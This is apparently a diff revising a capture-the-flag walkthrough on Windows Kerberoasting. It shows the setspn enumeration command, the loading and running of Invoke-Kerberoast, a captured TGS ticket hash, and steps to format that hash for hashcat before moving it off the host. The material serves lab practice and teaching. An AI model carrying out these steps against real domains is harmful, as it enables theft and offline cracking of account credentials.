@@ -14,12 +14,13 @@ Bypass Windows Applocker and escalate your privileges. Also covers examples of k
 ```
 Answer: obtained straight from ConsoleHost_history.txt file
 
-Task 3:
+## Task 3: Kerberoasting
 
-Non credentialed method to enumerate Windows with powershell to extract all accounts in the SPN:
+Non credentialed PowerShell method to enumerate Windows to extract all accounts in the SPN:
 ```
 setspn -T medin -Q */*
 ```
+Running it example results:
 ```
 PS C:\Users\dark> setspn -T medin -Q */*
 
@@ -66,7 +67,7 @@ PS C:\Users\dark>
 ```
 Answer: User for existing SPN is fela
 
-Next use invoke-kerberoast and obtain a ticket:
+### Next use invoke-kerberoast and obtain a ticket:
 
 First download the Invoke-Kerberoast.ps1 from either use wget, curl or just firefox browser.
 
@@ -81,26 +82,26 @@ PS C:\users\dark\downloads> dir
 
     Directory: C:\users\dark\downloads
 
-
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----       10/11/2026   7:03 AM          46848 Invoke-Kerberoast.ps1
-
 ```
-
+Then run, running the file and running the function are two different things.:
 ```
 PS C:\Users\dark> . .\Invoke-Kerberoast.ps1
-PS C:\Users\dark> Kerberoast
-Kerberoast : The term 'Kerberoast' is not recognized as the name of a cmdlet, function, script file, or operable
-program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
-At line:1 char:1
-+ Kerberoast
-+ ~~~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (Kerberoast:String) [], CommandNotFoundException
-    + FullyQualifiedErrorId : CommandNotFoundException
+```
+PowerShell executed the script file. The script's job is to create the function Invoke-Kerberoast and then exit. That's why you saw no output, the extra . (dot-sourcing) loaded the function into your current PowerShell session. 
 
+Then proved it worked:
+```
+PS> Get-Command Invoke-Kerberoast
+CommandType     Name
+-----------     ----
+Function        Invoke-Kerberoast
+```
+At that point the function existed in memory, so running the following produced the Kerberoast hash:
+```
 PS C:\Users\dark> invoke-Kerberoast
-
 
 TicketByteHexStream  :
 Hash                 : $krb5tgs$HTTP/fela:C0A2CB48F3039E24756B9EB0AED1B93A$F4D98B830385B74F767F67E7CD0ECAF4EB87A0C93ED3
@@ -129,7 +130,16 @@ SamAccountName       : fela
 DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
 ServicePrincipalName : HTTP/fela
 ```
-Save to File ToCrack.txt
+Save to File ToCrack.txt, and strip out dead space and returns:
+```
+# cat ToCrack.txt | tr -d '\n\r ' > hash.txt
+```
+should be one line for hashcat use cat or wc to check:
+```
+# wc -l hash.txt
+1 hash.txt
+```
+
 
 Incase upload server not installed first two options impacket smb server easier if installed but not if not installed. So since was not went with easier option uploadserver:
 
